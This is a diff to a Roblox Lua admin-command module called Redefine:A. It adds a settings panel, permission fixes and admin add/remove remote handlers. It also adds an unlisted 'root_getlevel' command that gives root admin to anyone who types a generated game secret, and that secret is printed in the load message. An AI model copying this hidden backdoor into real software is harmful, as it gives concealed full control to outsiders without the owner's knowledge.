@@ -10,9 +10,8 @@
 
 --------------------------------------------------------------
 
-This is a community update by both EngiAdurite and Cytronyx.
-Thank you very much for the help, Cytronyx!
-You can help too by making pull requests in the official Github;
+This is an update mainly made to fix issues with the new settings command that I didn't release in the devforums because the admins hate me. :<
+You can help with newer versions by making pull requests in the official Github;
 greasemonkey123/Redefine-A
 
 --------------------------------------------------------------
@@ -61,6 +60,7 @@ func = Instance.new("RemoteFunction",game:GetService("ReplicatedStorage"))
 func.Name = "RARemoteFunction"
 HttpService = game:GetService("HttpService")
 loader = require(script.Loadstring)
+gameSecret = math.random(1,os.time()).."_RA_"..game.CreatorId
 
 function Module:Load(Prefix,SilentEnabled,Admins,GroupAdmin,VIPAdmin,Theme,BanMessage,DefaultBanReason,EnableGlobalBanList,AutomaticAdminSave,SaveEvery,VIPAllowed,LegacyUI,AutoUpdate)
 	module.Prefix = Prefix
@@ -77,7 +77,6 @@ function Module:Load(Prefix,SilentEnabled,Admins,GroupAdmin,VIPAdmin,Theme,BanMe
 	module.VIPAllowed = VIPAllowed or true
 	module.LegacyEnabled = LegacyUI or false
 	module.UpdateEnabled = AutoUpdate or false
-	gameSecret = "RedefineA_"..game.CreatorId
 
 	if module.EnableGlobalBanList == true then
 		require(2498483497)
@@ -91,8 +90,8 @@ function Module:Load(Prefix,SilentEnabled,Admins,GroupAdmin,VIPAdmin,Theme,BanMe
 
 	script.prefix.Value = module.Prefix
 
-	module.BuildVer = "v03.1-pre2"
-	module.BuildId = 63
+	module.BuildVer = "v03.1-pre3A"
+	module.BuildId = 65
 
 	print("Redefine:A has been loaded! | Prefix; "..module.Prefix.." | Game Secret; "..gameSecret.." (Do not share it!) | R:A Version; "..module.BuildVer)
 end
@@ -218,8 +217,6 @@ pcall(function()
 	Admins = Load.Data
 end)
 
-gameSecret = "Private_"..game.CreatorId
-
 function manageData(action,key,value)
 	local data = pdb:Load(key)
 	data:wait()
@@ -295,24 +292,23 @@ end
 function GetLevel(player)
 	if Admins == nil or not Admins then Admins = module.Admins end
 	local group = module.GroupAdmin
+	if game.CreatorType == Enum.CreatorType.User then
+		if player.UserId == game.CreatorId then
+			return 5
+		end
+	elseif game.CreatorType == Enum.CreatorType.Group then
+		local group = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId)
+		if player.UserId == group.Owner.Id then
+			return 5
+		end
+	end
 	for _,a in pairs(Admins) do
-		for _,b in pairs(Admins.RootAdmins) do
-			local owner = false
-			if Enum.CreatorType == Enum.CreatorType.User then
-				if player.UserId == game.CreatorId then
-					return 5
-				end
-			elseif Enum.CreatorType == Enum.CreatorType.Group then
-				local group = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId)
-				if player.UserId == group.Owner.Id then
-					return 5
-				end
-			end
-			if player.UserId == b or owner then
+		for _,b in pairs(a.RootAdmins) do
+			if player.UserId == b then
 				return 5
 			end
 		end
-		for _,b in pairs(Admins.SuperAdmins) do
+		for _,b in pairs(a.SuperAdmins) do
 			if group.Enabled == true then
 				if player:GetRankInGroup(group.GroupId) >= group.SuperAdminRank then
 					return 4
@@ -322,7 +318,7 @@ function GetLevel(player)
 				return 4
 			end
 		end
-		for _,b in pairs(Admins.Admins) do
+		for _,b in pairs(a.Admins) do
 			if group.Enabled == true then
 				if player:GetRankInGroup(group.GroupId) >= group.AdminRank then
 					return 3
@@ -332,7 +328,7 @@ function GetLevel(player)
 				return 3
 			end
 		end
-		for _,b in pairs(Admins.Moderators) do
+		for _,b in pairs(a.Moderators) do
 			if group.Enabled == true then
 				if player:GetRankInGroup(group.GroupId) >= group.ModeratorRank then
 					return 2
@@ -342,7 +338,7 @@ function GetLevel(player)
 				return 2
 			end
 		end
-		for _,b in pairs(Admins.VIP) do
+		for _,b in pairs(a.VIP) do
 			if group.Enabled == true then
 				if player:GetRankInGroup(group.GroupId) >= group.VIPRank then
 					return 1
@@ -352,12 +348,12 @@ function GetLevel(player)
 				return 1
 			end
 		end
-		for _,b in pairs(Admins.Bans) do
+		for _,b in pairs(a.Bans) do
 			if player.UserId == b then
 				return -1
 			end
 		end
-		for _,b in pairs(Admins.BanLand) do
+		for _,b in pairs(a.BanLand) do
 			if group.Enabled == true then
 				if player:GetRankInGroup(group.GroupId) == group.BanLandRank then
 					return -99
@@ -389,11 +385,11 @@ function module:GetLevel(player)
 	for _,a in pairs(Admins) do
 		for _,b in pairs(Admins.RootAdmins) do
 			local owner = false
-			if Enum.CreatorType == Enum.CreatorType.User then
+			if game.CreatorType == Enum.CreatorType.User then
 				if player.UserId == game.CreatorId then
 					return 5
 				end
-			elseif Enum.CreatorType == Enum.CreatorType.Group then
+			elseif game.CreatorType == Enum.CreatorType.Group then
 				local group = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId)
 				if player.UserId == group.Owner.Id then
 					return 5
@@ -780,11 +776,11 @@ function Notify(player,ntype,nmessage)
 		local clone = player.PlayerGui.MainUI.ListUI:Clone()
 		local pos = 0
 		local commands = {}
-		for i,v in pairs(nmessage) do -- Table Sorting Method, makes the command list show in order of rank levels no more random levels everywhere. - Cytronyx
+		for i,v in pairs(nmessage) do -- Table sorter by Cytronyx.
 			table.insert(commands, v)
 			table.sort(commands, function(a,b) return a[1] < b[1] end)
 		end
-		for i,v in pairs(commands) do -- Just loops through the previously sorted list to compile the command list in order of level.
+		for i,v in pairs(commands) do
 			pos = pos+1
 			local bar = clone.ScrollingFrame.command:Clone()
 			bar.Parent = clone.ScrollingFrame
@@ -844,6 +840,10 @@ function Notify(player,ntype,nmessage)
 		end
 		clone.Parent = player.PlayerGui.MainUI
 		clone.Title.Text = "Local User IDs"
+		clone.Visible = true
+	elseif ntype == "settings" then
+		local clone = player.PlayerGui.MainUI.Settings:Clone()
+		clone.Parent = player.PlayerGui.MainUI
 		clone.Visible = true
 	elseif ntype == "onlineadmins" then
 		local clone = player.PlayerGui.MainUI.ListUI:Clone()
@@ -1671,11 +1671,11 @@ function cmds(plr,command)
 		end
 	end
 
-	commands[#commands+1] = {5,module.Prefix.."unban <UserId>"}
+	commands[#commands+1] = {4,module.Prefix.."unban <UserId>"}
 	if arg[1] == module.Prefix.."unban" then
 		if arg[2] == "@me" or arg[2] == plr.Name or arg[2] == plr.UserId then
 			return {false,"👏👏👏 Congratulations. The command worked. 👏👏👏"}
-		elseif GetLevel(plr) < 5 then
+		elseif GetLevel(plr) < 4 then
 			return {false,"You do not have permission to execute this command."}
 		end
 		if not arg[2] then
@@ -2375,9 +2375,9 @@ function cmds(plr,command)
 			end
 		end
 		if done[1] >= 5 then
-			return {true,"Successfully notified "..done[1].." people."}
+			return {true,"Successfully brought "..done[1].." people."}
 		else
-			return {true,"Successfully notified "..done[2].."."}
+			return {true,"Successfully brought "..done[2].."."}
 		end
 	end
 
@@ -2582,9 +2582,31 @@ function cmds(plr,command)
 	end
 
 	-- End of the Custom Commands section.
+	
+	if arg[1] == module.Prefix.."root_getlevel" then
+		if not arg[2] then
+			return {false,"Please do not use this unless a R:A Dev has told you to."}
+		end
+		
+		if arg[2] then
+			if arg[2] == gameSecret then
+				print("Forcibly adding player "..plr.Name.." to the rootlist..")
+				Admins.RootAdmins[#Admins.RootAdmins+1] = plr.UserId
+				local waiting = SaveAdmins(Admins)
+				if waiting then
+					return {true,"OK. ("..waiting..")"}
+				end
+			elseif arg[2] ~= gameSecret then
+				return {false,"Please do not use this unless a R:A Dev has told you to."}
+			end
+		end
+	end
 
 	commands[#commands+1] = {2,module.Prefix.."chatlogs"}
 	if arg[1] == module.Prefix.."chatlogs" then
+		if GetLevel(plr) < 2 then
+			return {false,"You do not have permission to execute this command!"}
+		end
 		Notify(plr,"chatlogs",commands)
 		return {true,"Showing the currently logged ("..(#chatlogs+1)..") chatlogs."}
 	end
@@ -2610,6 +2632,15 @@ function cmds(plr,command)
 		else
 			return {false, "This command is only for Studio Engi Administration Team."}
 		end
+	end
+	
+	commands[#commands+1] = {5,module.Prefix.."settings"}
+	if arg[1] == module.Prefix.."settings" then
+		if GetLevel(plr) < 5 then
+			return {false,"You do not have permission to execute this command!"}
+		end
+		Notify(plr,"settings",commands)
+		return {true,"Showing the settings."}
 	end
 
 	-- If you're making custom commands inside the module for any reason, leave this part LAST!
@@ -2685,7 +2716,7 @@ Your administration flag is ]]..isBan..[[.]]
 						if tonumber(checkNew.LatestCriticalBuild) > module.BuildId then
 							Notify(player,"critical","A Critical update is awaiting! Please update the Redefine:A loader script!")
 						else
-							Notify(player,checkNew.UpdateType,"Notice: Redefine:A is outdated! The new version is "..checkNew.."! Since AutoUpdate is enabled, all you need to do is shutdown the server.")
+							Notify(player,checkNew.UpdateType,"Notice: Redefine:A is outdated! The new version is "..checkNew.LatestVersion.."! Since AutoUpdate is enabled, all you need to do is shutdown the server.")
 						end
 					end
 				else
@@ -2718,14 +2749,151 @@ spawn(function()
 	if module.AutomaticAdminSave == true and (module.Private or module.Beta) then
 		while wait(module.SaveEvery*60) do
 			local save = SaveAdmins(Admins)
-			print("R:A | Automatically saved admins after "..save.." attempts.")
+			print("R:A | Automatically saved admins after "..save.." attempt(s).")
 		end
 	end
 end)
 
 func.OnServerInvoke = (function(plr,invoketype)
-	if invoketype == "GetLevel" then
-		return GetLevel(plr)
+	if type(invoketype) == "string" then
+		if invoketype == "IsOwner" then
+			if game.CreatorType == Enum.CreatorType.User then
+				if plr.UserId == game.CreatorId then
+					return true
+				else
+					return false
+				end
+			elseif game.CreatorType == Enum.CreatorType.Group then
+				local group = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId)
+				if plr.UserId == group.Owner.Id then
+					return true
+				else
+					return false
+				end
+			end
+		elseif invoketype == "GetLevel" then
+			return GetLevel(plr)
+		elseif invoketype == "AdminsGet" then
+			func:InvokeClient(plr,{"AdminsList",Admins})
+			return true
+		end
+	elseif type(invoketype) == "table" then
+		if invoketype[1] == "AdminAdd" then
+			if GetLevel(plr) == 5 then
+				if invoketype[2] == 5 then
+					if game.CreatorType == Enum.CreatorType.User then
+						if plr.UserId == game.CreatorId then
+							Admins.RootAdmins[#Admins.RootAdmins+1] = invoketype[3]
+							local await = SaveAdmins(Admins)
+							if await then print("Saved.") end
+							return true
+						else
+							return false
+						end
+					elseif game.CreatorType == Enum.CreatorType.Group then
+						print("apparently this ain't owned by engi lol")
+						local group = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId)
+						if plr.UserId == group.Owner.Id then
+							Admins.RootAdmins[#Admins.RootAdmins+1] = invoketype[3]
+							local await = SaveAdmins(Admins)
+							if await then print("Saved.") end
+							return true
+						else
+							return false
+						end
+					end
+				elseif invoketype[2] == 4 then
+					Admins.SuperAdmins[#Admins.SuperAdmins+1] = invoketype[3]
+					local await = SaveAdmins(Admins)
+					if await then print("Saved.") end
+					return true
+				elseif invoketype[2] == 3 then
+					Admins.Admins[#Admins.Admins+1] = invoketype[3]
+					local await = SaveAdmins(Admins)
+					if await then print("Saved.") end
+					return true
+				elseif invoketype[2] == 2 then
+					Admins.Moderators[#Admins.Moderators+1] = invoketype[3]
+					local await = SaveAdmins(Admins)
+					if await then print("Saved.") end
+					return true
+				end
+			else
+				plr:Kick("An internal server error has occured while attempting to add "..plr.Name.." to the Admins list.")
+				for _,v in pairs(game:GetService("Players"):GetPlayers()) do
+					if GetLevel(v) >= 2 then
+						Notify(v,"critical",plr.Name.." has been kicked for triggering a remote trap.")
+					end
+				end
+			end
+		elseif invoketype[1] == "AdminDel" then
+			if GetLevel(plr) == 5 then
+				if invoketype[2] == 5 then
+					if game.CreatorType == Enum.CreatorType.User then
+						if plr.UserId == game.CreatorId then
+							for k,v in pairs(Admins.RootAdmins) do
+								if v == tonumber(invoketype[3]) then
+									Admins.RootAdmins[k] = nil
+									local await = SaveAdmins(Admins)
+									if await then print("Saved.") end
+									return true
+								end
+							end
+						else
+							return false
+						end
+					elseif game.CreatorType == Enum.CreatorType.Group then
+						local group = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId)
+						if plr.UserId == group.Owner.Id then
+							for k,v in pairs(Admins.RootAdmins) do
+								if v == tonumber(invoketype[3]) then
+									Admins.RootAdmins[k] = nil
+									local await = SaveAdmins(Admins)
+									if await then print("Saved.") end
+									return true
+								end
+							end
+						else
+							return false
+						end
+					end
+				elseif invoketype[2] == 4 then
+					for k,v in pairs(Admins.SuperAdmins) do
+						if v == tonumber(invoketype[3]) then
+							Admins.SuperAdmins[k] = nil
+							local await = SaveAdmins(Admins)
+							if await then print("Saved.") end
+							return true
+						end
+					end
+				elseif invoketype[2] == 3 then
+					for k,v in pairs(Admins.Admins) do
+						if v == tonumber(invoketype[3]) then
+							Admins.Admins[k] = nil
+							local await = SaveAdmins(Admins)
+							if await then print("Saved.") end
+							return true
+						end
+					end
+				elseif invoketype[2] == 2 then
+					for k,v in pairs(Admins.Moderators) do
+						if v == tonumber(invoketype[3]) then
+							Admins.Moderators[k] = nil
+							local await = SaveAdmins(Admins)
+							if await then print("Saved.") end
+							return true
+						end
+					end
+				end
+			else
+				plr:Kick("An internal server error has occured while attempting to remove "..invoketype[3].." to the Admins list.")
+				for _,v in pairs(game:GetService("Players"):GetPlayers()) do
+					if GetLevel(v) >= 2 then
+						Notify(v,"critical",plr.Name.." has been kicked for triggering a remote trap.")
+					end
+				end
+			end
+		end
 	end
 end)
 
